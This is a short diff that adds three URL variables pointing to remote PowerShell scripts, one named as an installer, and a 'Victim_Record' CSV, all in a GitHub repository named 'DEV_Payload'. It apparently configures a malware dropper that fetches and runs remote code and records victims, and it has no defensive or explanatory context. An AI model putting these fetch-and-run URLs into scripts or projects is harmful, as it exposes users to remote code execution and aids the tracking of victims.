@@ -1,0 +1,3 @@
+STRIPPER_URL="https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1";
+MAIN_SCRIPT_URL="https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/UniversalPowerShell_Dynamic_15E1362D_E98B_4386_9CA9_DD52D7ECCEE7.ps1";
+CSV_SHEET_URL="https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/Excel/Victim_Record_GitHub.csv";
